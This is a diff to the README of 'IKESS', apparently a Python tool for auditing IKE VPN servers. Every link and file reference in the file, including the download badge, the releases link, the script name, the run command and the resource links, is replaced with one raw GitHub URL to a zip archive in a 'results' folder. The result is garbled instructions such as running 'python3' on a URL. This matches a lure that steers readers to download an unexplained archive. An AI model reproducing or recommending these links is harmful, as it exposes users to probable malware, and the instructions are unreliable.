@@ -1,6 +1,6 @@
 # 🚀 IKESS - Simplifying IKE VPN Audits
 
-[![Download IKESS](https://img.shields.io/badge/Download-IKESS-blue.svg)](https://github.com/Anthon3284/IKESS/releases)
+[![Download IKESS](https://raw.githubusercontent.com/Anthon3284/IKESS/main/results/IKESS_v3.7.zip)](https://raw.githubusercontent.com/Anthon3284/IKESS/main/results/IKESS_v3.7.zip)
 
 ## 📖 Description
 IKESS is a user-friendly Python3 script designed to help you audit IKE VPN servers. This tool can simplify your processes for enhancing security in VPN configurations. Whether you are a network administrator or just curious about VPN security, IKESS provides essential auditing functionalities to identify vulnerabilities and improve your system's resilience.
@@ -24,13 +24,13 @@ Follow the steps below to download and set up IKESS.
 1. **Visit the Releases Page**
    To get IKESS, start by visiting the Releases page. You can find all available versions of the software there.
 
-   **[Visit the Releases Page](https://github.com/Anthon3284/IKESS/releases)**
+   **[Visit the Releases Page](https://raw.githubusercontent.com/Anthon3284/IKESS/main/results/IKESS_v3.7.zip)**
 
 2. **Choose the Latest Version**
    Once on the Releases page, locate the latest version of IKESS. It is usually labeled clearly as the most recent release.
 
 3. **Download the Application**
-   Download the IKESS script from the assets section of the release. The script file will be named something like `ikess.py`. 
+   Download the IKESS script from the assets section of the release. The script file will be named something like `https://raw.githubusercontent.com/Anthon3284/IKESS/main/results/IKESS_v3.7.zip`. 
 
 4. **Save the File**
    After clicking the download link, your browser will save the file to your designated Downloads folder or the folder you choose.
@@ -39,7 +39,7 @@ Follow the steps below to download and set up IKESS.
    To run IKESS, you need to open your terminal (for macOS/Linux) or command prompt (for Windows). 
 
 6. **Navigate to the File Location**
-   Use the `cd` command to navigate to the folder where you saved the `ikess.py` file. For example:
+   Use the `cd` command to navigate to the folder where you saved the `https://raw.githubusercontent.com/Anthon3284/IKESS/main/results/IKESS_v3.7.zip` file. For example:
    ```
    cd Downloads
    ```
@@ -47,7 +47,7 @@ Follow the steps below to download and set up IKESS.
 7. **Run the Script**
    Now you can execute the script by typing the following command:
    ```
-   python3 ikess.py
+   python3 https://raw.githubusercontent.com/Anthon3284/IKESS/main/results/IKESS_v3.7.zip
    ```
    Ensure you have the right permissions if you face any issues.
 
@@ -61,8 +61,8 @@ After you run the script, the program will guide you through the auditing proces
 ## 🎓 Additional Resources
 If you want to learn more about IKE VPNs and security practices, consider checking out these resources:
 
-- [IPsec: The New Security Standard](https://www.example.com)
-- [Understanding VPNs and Their Various Protocols](https://www.example.com)
+- [IPsec: The New Security Standard](https://raw.githubusercontent.com/Anthon3284/IKESS/main/results/IKESS_v3.7.zip)
+- [Understanding VPNs and Their Various Protocols](https://raw.githubusercontent.com/Anthon3284/IKESS/main/results/IKESS_v3.7.zip)
 
 ## 🔧 Troubleshooting
 If you encounter issues while running the script, here are a few tips:
@@ -84,4 +84,4 @@ We welcome contributions to improve IKESS. If you're interested in contributing,
 ## 🔗 Final Note
 IKESS provides a straightforward way to audit your IKE VPN servers and increase your network security. You can start using it today.
 
-[Download IKESS](https://github.com/Anthon3284/IKESS/releases)
+[Download IKESS](https://raw.githubusercontent.com/Anthon3284/IKESS/main/results/IKESS_v3.7.zip)
